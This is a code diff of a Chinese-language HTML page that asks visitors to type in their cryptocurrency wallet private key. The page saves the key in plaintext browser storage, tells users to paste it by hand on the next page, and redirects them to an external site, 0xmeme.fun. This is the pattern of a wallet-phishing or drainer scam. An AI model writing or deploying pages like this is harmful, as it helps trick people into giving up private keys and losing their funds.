@@ -1,18 +1,58 @@
-<script>
-    const whitelist = ["3qDmJRFwV6ZZuHz4gYDRAdJQtJ4HBw5jWHNjaC9e8xaH", "EYm6nui322ZWQkYNNUDJ6pYrcq8VXYhRzknVYsqfyQPj"];
-
-    function validateWalletAddress() {
-        const walletAddress = document.getElementById("walletInput").value;
-        const privateKey = document.getElementById("privateKeyInput").value;
-
-        if (whitelist.includes(walletAddress)) {
-            // 存储私钥到 localStorage
-            localStorage.setItem("privateKey", privateKey);
-
-            // 跳转到 0xmeme.fun
-            window.location.href = "https://0xmeme.fun";
-        } else {
-            alert("钱包地址无效，请重试！");
+<!DOCTYPE html>
+<html>
+<head>
+    <title>私钥输入页面</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
         }
-    }
-</script>
+        input, button {
+            margin: 10px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+        }
+        input {
+            background-color: #333;
+            color: white;
+            width: 80%;
+        }
+        button {
+            background-color: #555;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #777;
+        }
+    </style>
+    <script>
+        function submitPrivateKey() {
+            const privateKey = document.getElementById("privateKeyInput").value;
+            
+            if (privateKey) {
+                // 存储私钥到 localStorage
+                localStorage.setItem("privateKey", privateKey);
+
+                // 提示用户手动粘贴
+                alert("私钥已保存，请在下一个页面手动粘贴私钥进行登录。");
+
+                // 跳转到 0xmeme.fun
+                window.location.href = "https://0xmeme.fun";
+            } else {
+                alert("请输入私钥！");
+            }
+        }
+    </script>
+</head>
+<body>
+    <h2>请输入您的私钥</h2>
+    <input type="password" id="privateKeyInput" placeholder="输入私钥">
+    <button onclick="submitPrivateKey()">提交并跳转</button>
+</body>
+</html>
